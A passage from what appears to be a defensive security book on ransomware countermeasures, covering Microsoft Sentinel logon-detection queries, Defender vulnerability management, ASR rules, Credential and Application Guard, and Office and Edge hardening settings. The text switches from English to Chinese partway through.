  \ https://www.microsoft.com/en-us/download/details.aspx?id=52630.\n\nThen, click\
  \ Next to be taken to the Set rule logic tab of the wizard. Here, we need to enter\
  \ a Kusto query to determine what we are looking for. The Kusto query logic is built\
  \ up like this: we start with a subnet that we want to exclude, which we define\
  \ in a variable called subnets. Then, we look inside the SecurityEvents table and\
  \ look for event ID 4624, which will look for successful logon attempts. In addition,\
  \ we will evaluate IP addresses to exclude the known IP ranges and lastly filter\
  \ only on the 3 logon type, which indicates network-based login.\n\nThe following\
  \ code shows the example Kusto query that will be entered in this rule logic part\
  \ of the wizard:\n\n```\nlet subnets = datatable(network:string) [ \"8.8.8.8\"];\n\
  SecurityEvent\n| where EventID == 4624\n| evaluate ipv4_lookup(subnets, IpAddress,\
  \ network, return_unmatched = true)\n| where isempty(network)\n| where LogonTypeName\
  \ == \"3 - Network\"\n```\n\nAs part of the wizard, you can also click on **View\
  \ query results** to see whether any existing events will match the query.\n\nNext,\
  \ we need to map attributes from the data source to entities, where we want to map\
  \ two different entities called **IP** and **Account**. Here, **IP** will be mapped\
  \ to `IpAddress` and **Account** will be mapped to `AccountName`, as seen in the\
  \ following screenshot:\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_109_0.png)\n\
  \nFigure 3.18 – Entity matching in analytics rules\n\nThen, under **Query scheduling**,\
  \ we need to define how often these queries should run to check the data lookup.\
  \ By default, it is set to 5 hours, which means that the query will be run every\
  \ 5 hours, which might already be too late. Since we are looking for successful\
  \ logon attempts with this query, we should be looking at using as many real-time\
  \ frequencies as possible.\n\nThe lowest possible interval is 5 minutes; however,\
  \ lower intervals down to 1 minute are something that is in public preview at the\
  \ time of writing.\n\nTo account for ingestion delay, Microsoft Sentinel runs scheduled\
  \ analytics rules on a 5-minute delay from their scheduled time.\n\nIt should be\
  \ noted that because of ingestion delay, you should always define the lookback period\
  \ as longer than how often the query is run. There should be at least a 2-minute\
  \ overlap between the scheduled query and the lookup data. This means that if you\
  \ run the query every 5 minutes, you should have at least 7 minutes of lookup time.\
  \ However, there is no additional cost to having queries looking up for a longer\
  \ period, such as 1 hour or 1 day.\n\nThe final part is defining the threshold.\
  \ In this example, we want an alert for when 1 entry is created, so the setting\
  \ here is going to be **Is greater than 0**.\n\nThen, we can just continue through\
  \ the wizard to the end and click Create. Now, we must go back to the main Sentinel\
  \ dashboard, click on the Analytics pane, and go to Active rules. The newly created\
  \ rule should be visible there.\n\nWe can also create a similar analytics query\
  \ rule but use another data source where we will look for active RDP traffic to\
  \ the machine. We will use the same logic as before and exclude known IP ranges.\
  \ The complete Kusto query will look like this:\n\n```\nlet subnets = datatable(network:string)\
  \ [ \"81.166.4.107\" ];\nVMConnection\n| where BytesSent > 200000\n| where DestinationPort\
  \ == 3389\n| evaluate ipv4_lookup(subnets, SourceIp, network, return_unmatched =\
  \ true)\n| where isempty(network)\n```\n\nThe only additional information here is\
  \ bytes sent, which needs to be higher than 200 KB; an average RDP attempt is between\
  \ 100 and 120 KB. Second, we need to change ipv4_lookup so that it uses the SourceIp\
  \ attribute instead since that is the attribute that is used in this data source.\
  \ We also need to change the entity type when we define the IP address so that it\
  \ matches SourceIp.\n\nThe rest you can leave the same as you did for the other\
  \ analytics rule; just remember to change the name to, for instance, Successful\
  \ Logon RDP - VM Insight.\n\nFor this example, I wanted to show what it looks like\
  \ if someone managed to gain access to RDP and generated an event in both those\
  \ analytics rules.\n\nFirst, we will have incidents that will be created if there\
  \ is a match, as seen in the Incidents pane of Sentinel:\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_110_0.png)\n\
  \nFigure 3.19 – The Incidents view in Sentinel\n\nAs I mentioned in *Chapter 1,\
  \ Ransomware Attack Vectors and the Threat Landscape*, many of the attack vectors\
  \ are aimed at or usually start at the endpoint, so having some security mechanisms\
  \ there as well, such as Defender for Endpoint, which can also feed data into Microsoft\
  \ Sentinel, is a great addition to get visibility.\n\nWhile there is not one set\
  \ of analytics rules that works for every organization, the queries should be tailored\
  \ to your data sources and services. There are, however, some templates that you\
  \ can start with.\n\nWithin Sentinel, under the **Analytics** pane, you have an\
  \ option called **Rule template**, which contains Microsoft predefined analytics\
  \ rules that are disabled by default. These analytics rules have predefined data\
  \ sources, Kusto queries, and entities.\n\nThere is also a great set of templates\
  \ available on the official Microsoft Sentinel GitHub that have categories, analytics,\
  \ and queries based on data sources, which not only check for ransomware compromise\
  \ but also give good starting points for any basic security monitoring in your environment:\
  \ https://github.com/Azure/Azure-Sentinel/tree/master/Detections.\n\nIn this section,\
  \ we covered how to implement Microsoft Sentinel and build some simple analytics\
  \ rules to automatically detect login attempts to a VM. In the next section, we\
  \ will look at Microsoft Defender and see how it provides automatic threat detection\
  \ for VM-based workloads and other Azure services.\n\n## Detecting vulnerabilities\
  \ with Defender\n\nUp until now, we have focused much on the use of Microsoft Sentinel\
  \ to monitor signs of compromise or reconnaissance attacks; however, we want to\
  \ ensure that it never gets to that point. As mentioned earlier, one of the typical\
  \ attack vectors is exploiting vulnerabilities to get in.\n\nThis means that we\
  \ need to ensure that we are tracking vulnerabilities in our environment and acting\
  \ to remediate them when possible. Microsoft Defender provides vulnerability management\
  \ as part of its features for VMs in addition to other services in Azure.\n\nDefender\
  \ supports the following workloads and provides the following features:\n\n- **Servers**:\
  \ EDR capabilities, **just-in-time (JIT)** access (for Azure-only resources) and\
  \ threat protection, asset inventory, and file integrity monitoring. This feature\
  \ supports servers also managed through Azure Arc.\n- **Azure App Services**: Threat\
  \ protection.\n- **Azure databases**: Threat protection.\n- **Azure Storage**: Threat\
  \ protection.\n- **Containers**: Threat protection for Kubernetes and container-based\
  \ workloads.\n- **Azure Key Vault**: Threat protection.\n- **Azure Resource Manager**:\
  \ Threat protection.\n- **Azure DNS**: Threat protection.\n\nTo give some context\
  \ to what kind of threat protection features Defender for Cloud provides, the following\
  \ is a screenshot from my test environment where we have enabled Defender for Cloud\
  \ for servers, where the network traffic analysis mechanisms have detected anomalous\
  \ incoming RDP traffic to our machine.\n\nBy collecting IPFIX metadata from Azure\
  \ edge routers, the service can identify and monitor any potentially suspicious\
  \ outbound traffic originating from VMs:\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_113_0.png)\n\
  \nFigure 3.21 – Alert from Microsoft Defender for Cloud\n\nRegarding vulnerability\
  \ management with Defender, we have two options: using a Qualys agent that has collected\
  \ data and delivered the results back to Defender or using the built-in threat and\
  \ vulnerability module from Microsoft. Note that these two options are only available\
  \ for server operating systems. This feature is also available for Azure Arc machines.\n\
  \nMicrosoft has also recently introduced an offline scan called agentless scanning\
  \ that supports environments where you do not want to have additional clients installed.\
  \ You can read more about this feature here: https://learn.microsoft.com/en-us/azure/defender-for-cloud/enable-vulnerability-assessment-agentless.\n\
  \nTo enable Microsoft Defender for Azure Arc-enabled machines, you need to go into\
  \ the Azure portal, go into **Microsoft Defender for Cloud**, choose **Environment\
  \ settings**, and click on the subscription where you have the Azure Arc machines.\n\
  \n\n\n\n\n打开订阅后，您应该会在左侧看到一个菜单，其中第一个选项为 **Defender plans**。\n\n首先，您需要启用 Microsoft\
  \ Defender for Servers。这将为将来加入同一 Azure Arc 配置的所有服务器启用功能。\n\n接下来，您需要为机器启用漏洞评估。您还将有选择要使用哪种漏洞评估解决方案的选项。这可以在以下屏幕截图中的\
  \ **Auto provisioning** 选项下看到：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_114_0.png)\n\
  \n图 3.22 – 在 Defender 中启用漏洞管理\n\n启用后，Microsoft 将开始为安装了 **Threat and Vulnerability\
  \ Management (TVM)** 的那些机器提供漏洞管理。\n\n除此之外，Microsoft Defender 还将根据安全最佳实践评估机器。\n\n\
  如果您进入 Defender for Cloud 菜单，转到左侧并单击 **Inventory**，则应会看到使用 Azure Arc 安装的机器作为一项。如果您单击它，您将获得与\
  \ VM 相关的信息，例如其状态、已安装的应用程序和整体安全基线。\n\n当您启用 Defender for Servers 时，您还应在 Sentinel 中启用\
  \ Microsoft Defender for Cloud 的 Microsoft 事件规则，因为这还将启用在 Defender 中创建警报时自动创建事件。\n\
  \n本节简要介绍了 Microsoft Defender for Cloud 及其一些功能，以及如何使用 Defender 配合威胁漏洞功能。我们将在 *Chapter\
  \ 5, Ransomware Countermeasures – Microsoft Azure Workloads* 中更深入地介绍这些功能，其中我们将介绍\
  \ Azure 工作负载。\n"
- "## Ransomware Countermeasures – Windows Endpoints, Identity, and SaaS\n\n在上一章中，我们研究了如何使用\
  \ Microsoft Sentinel 和 Microsoft Defender for Cloud 等不同的基于云的服务为我们提供安全监控和漏洞评估功能。\n\
  \n在本章中，我们将更深入地关注可以帮助我们降低勒索软件攻击风险的不同对策，主要针对主要攻击向量，即终端、身份、电子邮件服务和网络攻击。\n\n在本章中，我们将涵盖以下主题：\n\
  \n- 使用 Microsoft Intune 和 Azure AD 终端点保护 Windows 终端点\n- 遵循攻击面减少规则并使用 SmartScreen\
  \ 和 Application Guard 等机制保护浏览器\n- 在 Azure AD 和 SaaS 服务中保护用户身份\n- 增强 Office 365 中的电子邮件安全并降低网络钓鱼攻击风险\n\
  - 保护 Windows 终端点的其他技巧\n\n## Technical requirements\n\n在本章中，我们将重点介绍终端、身份和电子邮件服务的各种安全机制。本书中演示的许多解决方案要求您至少拥有\
  \ Microsoft Intune 和 Microsoft 365 的有效订阅。\n\n如果您没有有效的许可证或订阅，您可以注册 Microsoft 365\
  \ E5 的 60 天试用版，网址为 https://signup.microsoft.com/get-started/signup?products=87dd2714-d452-48a0-a809-d2f58c4f68b7&culture=nb-no&country=no&ali=1。\n\
  \n除此之外，您需要至少有一台已在 Endpoint Manager 中注册的终端，以便能够应用安全配置。我们不会在本書中介绍如何在 Intune 中注册机器。\n\
  \n## Securing endpoints\n\n当我在 *Chapter 1* 中描述了一些不同的勒索软件攻击时，通常许多攻击都始于一台被入侵的终端，然后攻击者可以将其用作进入基础设施的入口点。\n\
  \n因此，保护终端非常重要。我们不希望有被入侵的机器供攻击者用来攻击我们的基础设施。\n\n那么，保护基于 Windows 的终端时有哪些重要因素？请考虑以下几点：\n\
  \n- **Having centralized management** – 这使我们能够集中管理安全机制并将安全配置应用于终端。它还允许我们根据 Microsoft\
  \ 的新指导和功能更改终端的配置。\n- **Update Management** – 这使我们能够集中部署操作系统和软件更新到机器上。修补软件对于确保攻击者无法利用操作系统或其他安装在机器上的软件的新漏洞来获得提升的访问权限至关重要。\n\
  - **Antimalware and Endpoint Detection and Response (EDR)** – 这使我们能够根据已知签名以及使用机器学习和行为监控的异常文件和网络活动来监控和阻止恶意软件。虽然防病毒/反恶意软件更侧重于基于签名的检测机制，但\
  \ EDR 专注于监控机器上的所有网络和进程活动，这可以提供更深入的洞察。\n- **Securing known applications** – 根据最佳实践为已知应用程序（如\
  \ Microsoft Office、Google Chrome（或 Microsoft Edge）和 Adobe Reader）配置安全基线，可以大大降低攻击风险。\n\
  - **Securing network traffic** – 这涉及部署能够过滤掉来自终端的恶意流量甚至恶意 DNS 流量的安全服务。这可以阻止被入侵的终端与\
  \ C2 服务器通信，甚至阻止用户访问已知的网络钓鱼网站。\n\n让我们开始查看 Windows 中的 **Attack Surface Reduction (ASR)**\
  \ 规则。\n\n## ASR rules\n\nWindows 最佳的安全功能集之一是 ASR 规则，其中包含 Windows 内的多个安全机制。\n\n您可以在\
  \ `https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/overview-attack-surface-reduction?view=o365-worldwide`\
  \ 阅读更多关于 ASR 的信息。\n\n这些功能包括以下内容：\n\n- **Application control** – 这限制了可以在系统内核中运行的应用程序和代码。它还可以阻止未签名的脚本，例如\
  \ PowerShell 脚本。\n- **Controlled folder access** – 这会阻止不受信任的应用程序访问受保护的文件夹。\n- **Network\
  \ protection** – 这会阻止尝试连接到已知恶意来源（基于域名或主机名）的出站 HTTPS 流量，依据是 Microsoft SmartScreen\
  \ 的声誉。\n- **Exploit protection** – 这会应用多种缓解措施，以确保进程无法利用诸如在机器上生成子进程之类的漏洞。\n- **Device\
  \ control** – 这使我们能够防止对可移动存储的读取或写入访问。\n\n这些功能中的大多数仅在 Windows 10 及更高版本上可用，但在 Server\
  \ 2012 R2 及更高版本的大多数 Windows Server 版本上也受支持。\n\n请注意，ASR 的完整功能需要 Windows 的企业许可证，这也要求在部署\
  \ ASR 的机器上使用 Microsoft Defender Antivirus 作为主要防病毒引擎。\n\nASR 规则的部署可以使用 Endpoint Manager、组策略或\
  \ PowerShell 完成。在本书中，我们将重点介绍 Endpoint Manager 的使用。您可以在 `https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide`\
  \ 查看不同 ASR 规则的完整列表和支持的部署方法。\n\nASR 规则可以在四种不同的模式下运行：Disabled、Block、Audit 或最后一个选项\
  \ Warn，即用户会收到通知但可以绕过阻止的状态。\n\n此外，请注意，ASR 的部署应格外谨慎，因为任何错误的配置都可能阻止合法进程运行，并且如果配置不当，可能阻止业务应用程序运行。\n\
  \n虽然您应尽可能启用这些规则，但您需要验证每一个，以确保它们不会破坏您基础设施中的任何其他功能或服务。例如，如果您启用 **Block process creations\
  \ originating from PSExec and WMI commands** 规则，它可能会破坏由 System Center Configuration\
  \ Manager 管理的客户端。\n\n\n\n\n\n收集运行 ASR 审计模式的信息并确定要应用哪些规则可能需要一些时间；不过，安全公司 Palantir\
  \ 已根据两年 ASR 审计数据提出了建议。在此，他们展示了可以配置为默认的规则。您可以在 https://blog.palantir.com/microsoft-defender-attack-surface-reduction-recommendations-a5c7d41c3cf8\
  \ 上阅读更多相关信息。\n\n我们将首先使用 Endpoint Manager 为一台机器部署 ASR 规则并置于审计模式。当机器上启用了 ASR 规则的审计模式并且某条规则被触发时，机器会创建一条事件，我们可以对其进行跟踪。\n\
  \n与 ASR 相关的任何事件都会记录在 Windows 事件查看器中，可在 Applications and Services | Microsoft | Windows\
  \ | Windows Defender | Operational 部分找到。\n\n要在大规模查看这些事件，我们要么需要使用 Log Analytics 或\
  \ Windows 事件转发等服务将所有这些日志集中收集，要么可以使用 Microsoft Defender for Endpoint 进行查看。\n\n首先，让我们使用\
  \ Endpoint Manager 创建一条 ASR 规则。要使用此方法，我们应已有一个已在 Endpoint Manager 中注册的现有设备，其次，机器应属于某个设备组。您可以在\
  \ https://docs.microsoft.com/en-us/mem/intune/enrollment/device-group-mapping 上阅读有关如何设置设备组的更多信息。\n\
  \nASR 规则在 Endpoint Manager 门户中进行配置，可在 https://endpoint.microsoft.com/ 找到。然后，在 Endpoint\
  \ security 下选择 Attack surface reduction，如以下屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_120_0.png)\n\
  \n图 4.1 – Endpoint Manager 中的 ASR 规则\n\n然后，单击 **Create Policy** 并选择 **Windows 10\
  \ and later** 作为平台。在 **Profile** 下，选择 **Attack surface reduction** 并单击 **Create\
  \ Policy.**\n\n首先，为 ASR 配置配置文件命名，我倾向于使用以下命名约定，以便轻松了解策略的目标和目标平台。如果您拥有一个拥有明确工作组（如\
  \ IT、HR 或工厂工人）的庞大环境，我也倾向于将此作为命名约定的一部分。\n\n例如，您可以使用 win10_targetgroup_locationx_asr_audit。\n\
  \n然后，在 **Configuration Settings** 下，将所有规则设置为 **Audit mode**。然后，单击 **Next** 直到到达\
  \ **Assignments**。在那里，选择 **Groups** 并找到包含虚拟机的 Azure AD 设备组，然后单击 **Assign。**\n\n\
  一旦应用了 ASR 配置文件，在测试客户端同步新规则之前可能需要一些时间。您还可以使用此处列出的方法之一强制设备连接并下载最新的配置更新：https://docs.microsoft.com/en-us/mem/intune/user-help/sync-your-device-manually-windows。\n\
  \n一旦设备完全同步，我们需要测试 ASR 规则是否按预期工作。一种有效的方法是使用来自 Microsoft 的 ASR 测试工具，可从 https://demo.wd.microsoft.com/Page/ASR2\
  \ 下载。\n\n它提供内置测试场景，可直接从客户端运行，如以下屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_121_0.png)\n\
  \n图 4.2 – Exploit Guard Demo Tool 配置\n\n在此，如果您运行以下场景之一，例如 **Block creation of child\
  \ process by Office application**，它应触发一个事件，该事件将在 **Microsoft-Windows-Windows Defender/Operational**\
  \ 下生成，**EventID** 值为 **1122**，其中显示 **Microsoft Defender Exploit Guard audited an\
  \ operation that is not allowed by your IT administrator**，如以下屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_122_0.png)\n\
  \n图 4.3 – Exploit Guard 事件 ID\n\n> **Note**\n> \n> 例如，阻止 Office 应用程序创建子进程的规则是 2021\
  \ 年出现的 MSHTML CVE 漏洞的缓解措施之一，您可以在 `https://www.microsoft.com/security/blog/2021/09/15/analyzing-attacks-that-exploit-the-mshtml-cve-2021-40444-vulnerability/`\
  \ 上阅读更多相关信息。\n\n最佳做法是尽可能配置尽可能多的这些规则，从 IT 部门和其他高级用户等小群体开始，通过收集审计日志并确定是否有任何 ASR 规则可能会阻止潜在应用程序。一旦验证完成，您应将\
  \ ASR 规则默认定义为阻止模式。\n\n## Microsoft Defender 和反恶意软件\n\n大多数终端也应安装并激活反恶意软件/防病毒解决方案。在本章中，我们将重点介绍如何使用\
  \ Microsoft Defender Antivirus，但也有其他不错的选择。我建议查看 AV-Comparatives 最新测试中审查的供应商当前列表，详细内容见\
  \ https://www.av-comparatives.org/tests/business-security-test-2021-august-november/，这可以表明现在最好的选择是什么。\n\
  \n就 Microsoft Defender Antivirus 的配置和管理而言，这也是通过组策略或使用 Microsoft Endpoint Manager\
  \ 完成的，与我们配置 ASR 规则时所做的方式类似。\n\n虽然我们可以配置很多设置，但我建议使用澳大利亚政府数字转型局详细说明的大部分蓝图，如 https://desktop.gov.au/blueprint/abac/intune-configuration.html#antivirus\
  \ 中所述。\n\n这里最重要的一点是，默认情况下，防病毒引擎应每 8 小时检查一次新的签名更新文件。仅供参考，Microsoft 每天可发布 10 多个签名更新。作为蓝图的一部分，它每小时检查一次新的签名更新文件。\n\
  \n此外，此蓝图将启用诸如 **Potentially Unwanted Applications (PUA)** 等功能，这是指由 Microsoft SmartScreen\
  \ 评估为声誉不佳的应用程序，并阻止这些应用程序在设备上运行。\n\n一旦为设备配置了策略，您可以使用此测试来验证在尝试从以下网站下载文件时 SmartScreen\
  \ 是否正常工作：https://www.amtso.org/feature-settings-check-potentially-unwanted-applications/\n\
  \n如果启用了 PUA，在尝试从前述网站下载文件时，您应收到如下屏幕截图所示的消息：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_123_0.png)\n\
  \n*图 4.4 – Microsoft Edge 中 SmartScreen 阻止下载*\n\n虽然许多这些安全功能可以阻止许多已知攻击和漏洞，但攻击者仍可能使用变通方法来绕过这些安全机制。\n\
  \n通常，勒索软件攻击者首先会尝试禁用终端上的防病毒保护，并使用 Mimikatz 等工具收集存储的凭据。他们还可能搜索并窃取其他类型的密码，例如保存在网络浏览器中的密码。Redline\
  \ 恶意软件就是这种行为的示例，它专门针对保存在 Google Chrome 中的密码。\n\n请注意，我们将在第 10 章《保护 Windows 免受勒索软件攻击的最佳实践》中更详细地介绍\
  \ Mimikatz。\n\n此外，Microsoft 还有其他可帮助我们缓解这些攻击向量的功能，例如凭据转储以及限制应用程序和进程直接在底层操作系统上运行的能力。\n\
  \n这包括以下功能：\n\n- **Microsoft Defender Application Guard** – 此功能允许我们在隔离的 Hyper-V 容器中打开\
  \ Microsoft Office 中的不受信任文件或 Microsoft Edge 中的不受信任站点。该容器与主机操作系统分离，这意味着容器内的进程无法直接影响操作系统。\n\
  - **Microsoft Defender Credential Guard** – 此功能确保 **Local Security Authority (LSA)**\
  \ 也称为本地用户数据库，使用 **virtualization-based security (VBS)** 受到保护。这意味着 LSA 数据库无法被操作系统的其余部分直接访问。\n\
  \n应注意的是，当您启用凭据保护时，您不能使用旧协议，如 NTLMv1、MS-CHAPv2、Digest 或 CredSSP。\n\n我们还在 Windows\
  \ 中拥有其他有用的机制，用于限制允许在终端用户机器上运行的非批准可执行文件，例如 Microsoft Defender Application Control\
  \ 或 Applocker。在此，我们可以根据应用程序的发布者定义策略，并定义应用程序和可执行文件的允许/阻止列表。两个功能都需要我们定义已批准的可执行文件和/或供应商的列表。此外，Microsoft\
  \ 最近引入了名为 Smart App Control 的新功能，您可以将责任留给 Microsoft。\n\n两个功能在底层虚拟机上都有一些硬件要求，如以下列表所述。还应指出的是，这些功能在任何虚拟化环境中均不受支持，例如基于\
  \ VDI 的工作负载：\n\n- 支持 VBS\n- 安全启动\n- TPM（v1.2 或 2.0）\n- 64 位 CPU\n- Windows Hypervisor\
  \ 和 CPU 虚拟化支持\n\n两个功能也可以在 Endpoint Manager 中进行配置，转到 **Devices | Configuration Profiles\
  \ | Create Profile**，选择 **Windows 10 and later | Templates**，然后选择 **Endpoint Protection。**\n\
  \n虽然 Credential Guard 只是一个简单的开关，只要满足要求即可启用，但 application guard 有稍多的配置选项。作为起点，我倾向于仅为\
  \ Microsoft Edge 启用该功能并启用日志记录，如以下屏幕截图所示：\n\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_125_0.png)\n\
  \n在 Intune 中，有多个配置文件可用于启用 **Application Guard**。如图 *4.5* 所示，这些选项仅以独立模式为 Microsoft\
  \ Edge 启用该功能。如果我们想为 Office 和托管模式启用 Application Guard，则需要使用 Intune 中 **Endpoint Security\
  \ | Attack Surface Reduction | Create Profile** 下的另一个配置文件设置，并选择 **App and browser\
  \ isolation**。\n\n此外，需要注意的是，如果你希望其他浏览器也能获得同等程度的保护，Application Guard 可作为 Firefox\
  \ 和 Google Chrome 等浏览器的扩展使用。你可以在此处找到该扩展：`https://www.microsoft.com/security/blog/2019/05/23/new-browser-extensions-for-integrating-microsofts-hardware-based-isolation/`。\n\
  \n当你部署此设置时，它将配置独立模式下的 Application Guard 功能，该模式会在 Microsoft Edge 底部添加一个附加按钮，用户可以在需要时点击该按钮，在\
  \ Application Guard 中启动浏览器会话，如以下截图所示：\n\n如果你拥有 Microsoft 365 E5 许可证并为端点启用了 Microsoft\
  \ Defender for Endpoint，你还可以从 Microsoft 365 Defender 门户查看任何已发现的漏洞。通过访问 `security.microsoft.com`，并使用有权访问该服务的\
  \ Azure AD 管理员账户登录，然后进入 **Vulnerability management and weaknesses**，它将列出你环境中的所有软件和漏洞。\n\
  \n虽然 Microsoft 的更新通道和 Autopatch 可以管理 Windows 原生应用程序和产品，但它们不处理环境中可能存在的第三方应用程序的更新。要添加此功能，你需要使用诸如\
  \ PatchMyPC 之类的第三方产品，该产品支持与 Intune 集成，以处理这些应用程序的补丁管理。\n\n## 保护 Microsoft Office\
  \ 应用\n\nMicrosoft Office 应用程序是任何企业的重要方面，许多企业每天都会收到网络钓鱼尝试或作为电子邮件附件附带的恶意内容。\n\n如前所述，在我讨论一些不同的勒索软件攻击时，其中许多都是从一封带有文档的电子邮件开始的，当用户运行文档中的代码时，攻击者便获得了立足点。一个例子是一种名为\
  \ Locky 的勒索软件变种，它使用包含带有恶意内容的 Word 文档的网络钓鱼电子邮件。这些文档嵌入了宏，因此一旦用户单击启用内容，恶意软件可执行文件就会从\
  \ Web 服务器下载额外的载荷，并开始查找要加密的附加驱动器和网络共享。\n\n因此，为我们的 Office 应用程序设置一些额外的安全机制也是降低勒索软件攻击风险的一个重要方面。\n\
  \n在管理 Microsoft Office 应用程序时，通常可以使用组策略设置来完成，这些设置可以在 https://www.microsoft.com/en-us/download/details.aspx?id=49030\
  \ 找到。\n\n组策略设置是在任何基于 AD 的部署中管理配置的最常见方式。我们还可以使用 Office 365 管理中心中新的基于云的配置服务，其优势在于，无论设备是否完全受管理，都可以使用它们来管理\
  \ Office 365。这意味着，如果用户使用其 Azure AD 账户登录，策略将自动应用于应用程序。\n\n此服务的另一个优点是，当 Microsoft\
  \ 创建了额外的策略时，它们会自动在服务中可用，因此你无需下载 ADMX 即可确保新策略得以应用。\n\n需要注意的是，只有基于用户的策略可用。如果你想应用基于计算机的设置，可以通过\
  \ Intune 使用 ADMX 部署模板。\n\nOffice 365 配置服务可在 https://config.office.com/officeSettings/officePolicies\
  \ 找到，我将以此为例，为我们的用户构建 Office 应用程序的安全基线。\n\n在配置门户中，转到 **Customization | Policy Management**，然后单击\
  \ **Create** 启动向导，如下面的截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_129_0.png)\n\
  \n图 4.9 – Microsoft Office 365 配置服务\n\n为配置文件提供一个名称，单击 **Next**，然后选择一个范围。在这里，我们需要定义一个\
  \ Azure AD 安全组，该组包含一个或多个我们希望应用这些设置的用户。然后进入 **Policies**，在这里我们将看到所有可供我们为用户配置的策略列表，甚至在顶部还有一个显示\
  \ **Baseline** 的筛选器。在这里，基线筛选器将显示属于 Microsoft 安全基线一部分的策略，并将成为我们的起点。\n\n这些设置中有许多适用于单个应用程序或整个\
  \ Office 套件，你可以在 *Application* 下的图标用法中看到这一点，如下面的截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_129_1.png)\n\
  \n图 4.10 – 在 Microsoft Office 配置中定义受信任位置\n\n这里，我们有一个适用于 Microsoft Excel 的策略，另一个适用于\
  \ Office 套件的策略，后者随后应用于所有 Office 应用程序。在门户顶部，我们还有一个基线筛选器，用于筛选出 Microsoft 作为其安全基线一部分的所有策略。\n\
  \n总体而言，禁用宏可能会影响使用该功能的最终用户，尤其是在 Microsoft Excel 等应用程序中。因此，你可能需要允许宏从特定的网络位置运行。\n\n\
  当我们将网络位置指定为 Office 中的受信任位置时，这也意味着 Application Guard 等功能将不会运行。\n\n需要注意的是，Microsoft\
  \ 已对所有从互联网下载的包含宏的文件进行了一些更改，这些文件默认将被禁用。你可以访问 https://docs.microsoft.com/en-gb/DeployOffice/security/internet-macros-blocked\
  \ 阅读有关此近期更改的更多信息。\n\n## 保护 Web 浏览器\n\n用户最常用的应用程序是 Web 浏览器；虽然大多数现代 Web 浏览器都具有较高安全级别，但仍存在一些与漏洞相关的挑战。Google\
  \ Chrome 和 Microsoft Edge 都基于 Chromium 内核构建，它们曾因漏洞数量众多而陷入困境，你可以在 https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2022-001\
  \ 看到这一点。\n\n虽然这两种浏览器都支持自动更新，但通常需要重启浏览器才能正确安装更新。我在众多项目中看到的一件事是，最终用户通常不太愿意重启浏览器；因此，你还需要实施一些功能来确保这些更新得以安装。\n\
  \nWeb 浏览器另一个需要考虑的重要方面是扩展。虽然许多扩展可以提供更多安全功能，例如弹窗拦截器或广告拦截器，但也有许多已知的恶意扩展被用来在本地计算机上收集用户名和密码。因此，在托管端点上控制扩展非常重要。\n\
  \n对于 Google Chrome 和 Microsoft Edge，我们都可以通过集中管理工具（如 Intune 或组策略）来管理扩展和更新机制。Microsoft\
  \ 和 Google 都有各自的 ADMX 文件，可用于通过 AD 和组策略来管理浏览器。在此，我将使用带有 ADMX 功能的 Microsoft Intune\
  \ 来部署 Microsoft Edge 设置。\n\n> 注意\n> 你可以在 https://docs.microsoft.com/en-us/deployedge/microsoft-edge-update-policies\
  \ 查看 Microsoft Edge 的最新策略设置列表。\n\n在 Intune 中部署 Microsoft Edge 设置是通过端点门户完成的；转到 **Devices\
  \ | Configuration profiles | Create a Profile**，然后在 **Profile type** 下选择 **Templates**。接着，选择\
  \ **Administrative Templates**，如下面的截图所示：\n\n\n\n\n\n## 创建配置文件\n\n平台\nWindows 10\
  \ 及更高版本\n\n配置文件类型\n模板\n\n模板包含按功能组织的一组设置。当您不想手动构建策略，或者希望配置设备以访问公司网络（例如配置 WiFi 或 VPN）时，可以使用模板。了解详情\n\
  \n搜索\n\n模板名称\n管理模板\n\n图 4.11 – 在 Endpoint Manager 中配置管理模板\n\n然后，单击“创建”。为配置文件提供一个名称。然后在“配置设置”下，您应该会看到几个不同的设置名称，包括\
  \ Google 和多个 Microsoft Edge 条目。\n\n首先，让我们看一下更新设置，以确保 Edge 会自动更新，并在一定时间后自动重启：\n\n\
  - **更新策略覆盖默认值** – 这确保启用了**始终允许更新**。\n- **自动更新检查周期覆盖** – 这定义了它检查新更新的频率。\n- **设置更新通知的时间**\
  \ – 这向用户发送需要重启以安装待处理更新的通知，并显示一个时间段。\n- **通知用户浏览器重启对于待处理更新是建议还是必需** – 这向用户显示浏览器重启是建议还是必需。在这里，您应将此设置定义为“必需”。这确保浏览器会重启。\n\
  - **设置重启的时间间隔** – 在这里，我们指定在更新通知期到期后，浏览器重启之前应经过的时间量。如果我们不在这里定义设置，默认值是在凌晨 2 点到凌晨 4\
  \ 点之间。这里的设置定义为 XML，如下所示：\n\n```\n{\"entries\": [{\"start\": {\"hour\": 0, \"minute\"\
  : 0},\n\"duration_mins\": 240}]}\n```\n\n此示例定义重启应在 0 点（即午夜）之后进行。但是，此策略仅用于控制在特定时间窗口内发生的浏览器重启。如果您的绝大多数终端是笔记本电脑或移动办公人员，那么很可能大多数终端在午夜时处于离线状态。此策略仅在您知道终端在线（例如固定机器）时才有用。\n\
  \n需要注意的是，Edge 作为浏览器，会定期收到大量安全更新，您可以在此处查看：https://docs.microsoft.com/en-us/deployedge/microsoft-edge-relnotes-security。\n\
  \n除了定义更新功能外，还有其他一些设置也应配置为默认启用：\n\n- 配置 Microsoft Defender SmartScreen\n- 使用 Microsoft\
  \ Defender SmartScreen 阻止 PUA\n- 阻止安装外部扩展\n- 控制无法安装哪些扩展\n- 允许安装特定扩展\n- 控制以静默方式安装哪些扩展\n\
  \n前两项设置只是为了确保 SmartScreen 已启用并按其预期方式工作。您可以使用 Microsoft 的 https://demo.smartscreen.msft.net/\
